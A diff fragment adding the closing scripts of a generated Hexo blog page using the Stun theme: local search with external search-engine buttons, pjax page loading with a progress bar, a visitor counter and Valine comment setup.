+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
+  // 加载进度条的计时器
+  var loadingTimer = null;
+
+  // 重置页面 Y 方向上的滚动偏移量
+  document.addEventListener('pjax:send', function () {
+    $('.header-nav-menu').removeClass('show');
+    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
+      $('html').velocity('scroll', {
+        duration: 500,
+        offset: $('#header').height(),
+        easing: 'easeInOutCubic'
+      });
+    }
+
+    var loadingBarWidth = 20;
+    var MAX_LOADING_WIDTH = 95;
+
+    $('.loading-bar').addClass('loading');
+    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    clearInterval(loadingTimer);
+    loadingTimer = setInterval(function () {
+      loadingBarWidth += 3;
+      if (loadingBarWidth > MAX_LOADING_WIDTH) {
+        loadingBarWidth = MAX_LOADING_WIDTH;
+      }
+      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    }, 500);
+  }, false);
+
+  window.addEventListener('pjax:complete', function () {
+    clearInterval(loadingTimer);
+    $('.loading-bar__progress').css('width', '100%');
+    $('.loading-bar').removeClass('loading');
+    setTimeout(function () {
+      $('.loading-bar__progress').css('width', '0');
+    }, 400);
+    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
+      $(this).remove();
+    });
+    $('script[data-pjax], #pjax-reload script').each(function () {
+      $(this).parent().append($(this).remove());
+    });
+
+    if (Stun.utils.pjaxReloadBoot) {
+      Stun.utils.pjaxReloadBoot();
+    }
+    if (Stun.utils.pjaxReloadScroll) {
+      Stun.utils.pjaxReloadScroll();
+    }
+    if (Stun.utils.pjaxReloadSidebar) {
+      Stun.utils.pjaxReloadSidebar();
+    }
+    if (false) {
+      if (Stun.utils.pjaxReloadHeader) {
+        Stun.utils.pjaxReloadHeader();
+      }
+      if (Stun.utils.pjaxReloadScrollIcon) {
+        Stun.utils.pjaxReloadScrollIcon();
+      }
+      if (Stun.utils.pjaxReloadLocalSearch) {
+        Stun.utils.pjaxReloadLocalSearch();
+      }
+    }
+  }, false);
+}, false);</script><div id="pjax-reload"><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script></div><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script data-pjax="">function loadValine () {
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var guest_info = 'nick,mail,link';
+
+  guest_info = guest_info.split(',').filter(function(item) {
+    return GUEST_INFO.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#valine-container',
+    appId: 'PRycUaQbxE5mebmnKTjtaRJg-gzGzoHsz',
+    appKey: 'jGyP9zr05MTuqHpWaIkgYW4h',
+    notify: true,
+    verify: true,
+    placeholder: '写点什么吧',
+    avatar: 'mp',
+    meta: guest_info,
+    pageSize: '10' || 10,
+    visitor: true,
+    recordIP: true,
+    lang: 'zh-cn,en' || 'zh-cn',
+    path: window.location.pathname
+  });
+}
+
+if (true) {
+  loadValine();
+} else {
+  window.addEventListener('DOMContentLoaded', loadValine, false);
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
